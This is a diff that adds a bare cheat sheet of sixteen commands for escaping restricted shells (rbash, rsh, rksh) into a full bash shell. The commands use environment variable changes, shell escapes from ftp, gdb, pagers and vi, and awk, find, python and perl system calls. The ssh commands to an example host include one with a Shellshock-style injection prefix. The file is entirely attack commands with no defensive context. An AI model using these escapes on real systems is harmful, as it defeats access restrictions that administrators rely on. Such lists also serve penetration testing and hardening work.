@@ -1,0 +1,22 @@
+Escape from rbash / rsh / rksh
+
+1) /bin/bash
+2) export PATH=/bin:/usr/bin:$PATH
+3) export SHELL=/bin/sh
+4) cp /bin/sh /some/dir/from/PATH sh
+5) ftp
+!/bin/bash
+6) gdb
+!/bin/bash
+7) more / less / man
+!/bin/bash
+**8) vi / vim
+:!/bin/bash**
+9) awk 'BEGIN{system("/bin/bash")}'
+10) find / -name "test" -exec /bin/bash \;
+11) ssh guest@10.20.30.40 -t "/bin/bash"
+**12) ssh guest@10.20.30.40 -t "bash --noprofile"**
+13) ssh guest@10.20.30.40 -t "() { :; }; /bin/bash"
+14) echo "/bin/bash" | tee script.sh
+15) python -c 'import os; os.system("/bin/bash")'
+16) perl -e 'exec "/bin/bash";'
